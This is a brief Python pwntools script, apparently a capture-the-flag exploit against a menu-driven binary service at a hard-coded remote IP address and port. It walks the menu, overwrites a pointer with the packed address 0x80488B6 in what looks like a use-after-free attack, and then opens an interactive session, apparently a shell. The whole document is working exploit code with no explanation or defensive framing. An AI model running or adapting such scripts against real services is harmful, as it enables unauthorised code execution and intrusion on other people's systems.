from pwn import *

s = remote('211.117.60.76', 8888)
#s = remote('192.168.33.10',1234)
raw_input()

s.recvuntil('6. Exit')
s.send(p32(1))
s.recvuntil('6. Exit')
s.send(p32(2))
s.recvuntil('6. Exit')
s.send(p32(4))
s.recvuntil('Length :')
s.send(p32(0x8))
s.recvuntil('Name :')
s.sendline(p32(0x80488B6))
s.recvuntil('6. Exit')
s.send(p32(3))
s.interactive()
